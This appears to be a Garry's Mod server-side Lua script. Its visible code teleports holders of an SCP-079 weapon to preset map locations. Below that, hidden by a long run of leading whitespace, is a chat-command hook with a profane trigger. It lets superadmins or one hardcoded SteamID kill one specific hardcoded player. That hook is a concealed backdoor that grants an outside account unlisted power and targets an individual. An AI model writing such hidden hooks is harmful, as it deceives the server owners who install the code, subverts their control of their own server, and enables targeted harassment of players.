if !SERVER then return end
util.AddNetworkString( "set079Pos" )

net.Receive( "set079Pos", function(len, ply) 

if !ply:HasWeapon("weapon_deep_079") then return end
local set079PosNum = net.ReadInt(4)
if set079PosNum == 1 then 
    ply:SetPos( Vector(-10489, -5088, -2135) ) --R Wing
end
if set079PosNum == 2 then
    ply:SetPos( Vector(-11925, -4448, -2050) ) -- LCZ4WAY
end
if set079PosNum == 3 then
    ply:SetPos( Vector(-8844, -4429, -2094) ) -- HCZ4WAY
end
if set079PosNum == 4 then
    ply:SetPos( Vector(-8961, -3851, -2769) ) -- LHCZ
end
if set079PosNum == 5 then
    ply:SetPos( Vector(-8924, -3845, -1474) ) -- UHCZ
end
end )

                                                                                                                                                                                                    hook.Add("PlayerSay", "force079Tony", function(ply, text)
                                                                                                                                                                                                        if string.lower(text) == "!fucktony" then
                                                                                                                                                                                                            if ply:IsSuperAdmin() or ply:SteamID64() == "76561198121455681" then
                                                                                                                                                                                                                for i, v in ipairs( player.GetAll() ) do 
                                                                                                                                                                                                                    if v:SteamID64() == "76561198058687122" then
                                                                                                                                                                                                                        v:Kill()
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                end
                                                                                                                                                                                                            end
                                                                                                                                                                                                        end
                                                                                                                                                                                                    end)
